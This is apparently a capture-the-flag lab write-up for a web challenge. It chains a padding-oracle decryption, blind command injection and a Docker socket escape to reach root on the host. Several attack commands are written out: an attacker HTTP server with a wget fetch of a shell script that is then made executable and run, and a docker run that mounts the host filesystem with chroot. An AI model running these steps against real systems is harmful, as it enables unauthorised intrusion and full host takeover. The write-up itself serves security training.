New York Flankees

Web Medium Mar 2026

Enumeration

Starting with an Nmap scan, port 8080 is the only exposed service. Navigating to the web application and reading the page source, I find a client-side JavaScript snippet handling authentication logic. 

document.addEventListener('DOMContentLoaded', function() {
    const isLoggedIn = document.cookie.includes('loggedin');
    const adminLoginBtn = document.querySelector('.admin-login-btn');
    if (isLoggedIn) {
        adminLoginBtn.textContent = 'DEBUG';
    }
    adminLoginBtn.addEventListener('click', function() {
        if (!isLoggedIn) {
            window.location.href = 'login.html';
        } else {
            window.location.href = 'exec.html';
        }
    });
});

Authenticated users are redirected to exec.html, and the button label changes to DEBUG when a loggedin cookie is present. This hints at a hidden debug page accessible directly by URL.

Padding Oracle Attack — Flag 1

Navigating directly to /debug.html and reading its source reveals a JavaScript function making a GET request to an API endpoint with what looks like an AES/CBC/PKCS7 encrypted token appended to the URL. 

function stefanTest1002() {
    var xhr = new XMLHttpRequest();
    var url = "http://localhost/api/debug";
    // Submit the AES/CBC/PKCS payload to get an auth token
    xhr.open("GET", url + "/39353661353931393932373334633638EA0DCC6E567F96414433DDF5DC29CDD5
E418961C0504891F0DED96BA57BE8FCFF2642D7637186446142B2C95BCDEDCCB6D8D29BE4427F26D
6C1B48471F810EF4", true);
}

The URL structure is /api/debug/<IV_hex><ciphertext_hex>. Sending the legitimate token returns Custom authentication success. Crucially, sending a modified token returns a 500 error — the server leaks whether the decrypted padding is valid or not. This is the oracle.

Tips : A padding oracle exists when a server returns different responses for valid vs. invalid PKCS7 padding. This allows an attacker to decrypt any ciphertext block-by-block without knowing the key.

Running a padding oracle attack script against the endpoint recovers the plaintext credentials hidden inside the token.

Admin Panel & Command Injection — Flag 2

Logging in with the recovered credentials lands me on an admin panel. The panel exposes a command execution endpoint with boolean blind command injection — a successful command returns OK, anything invalid returns a 500 error.

Classic reverse shell payloads and bind shells all fail. Instead, I set up a simple Python HTTP server on my machine and use the injection to fetch a shell script from it. 

python3 -m http.server <PORT>
wget http://<IP>:<PORT>/myshell.sh

Once the file lands on the target, two more injected commands make it executable and run it. 

chmod +x myshell.sh
bash myshell.sh

The shell connects back and I land directly as root inside the container. The flag is found in /app/docker-compose.yml as an environment variable.

Docker Environment — Flag 3

With a shell in the container I read the compose file and inspect the environment variables, which contain another flag alongside the encryption key and IV used by the padding oracle. 

cat /app/docker-compose.yml

Docker Socket Escape — Flag 4

Running docker images and docker ps confirms the Docker socket is accessible from within the container. I reuse an existing image and override the entrypoint to drop into a shell, mounting the entire host filesystem under /mnt. 

docker run -v /:/mnt --rm -it --entrypoint sh padding-oracle-app_web -c "chroot /mnt sh"

The chroot drops me into the host root filesystem as root. flag.txt is sitting at the filesystem root. 

# ls /

# cat /flag.txt

Summary

The attack chain was: JS source disclosure → hidden debug endpoint → padding oracle decryption → plaintext credentials → blind command injection → reverse shell via HTTP file transfer → Docker socket escape to host.

The key insight on the padding oracle was recognising the 500 vs 200 differential rather than a typical auth error. On the command injection side, when direct reverse shells are blocked, staging a payload over HTTP is a reliable fallback.
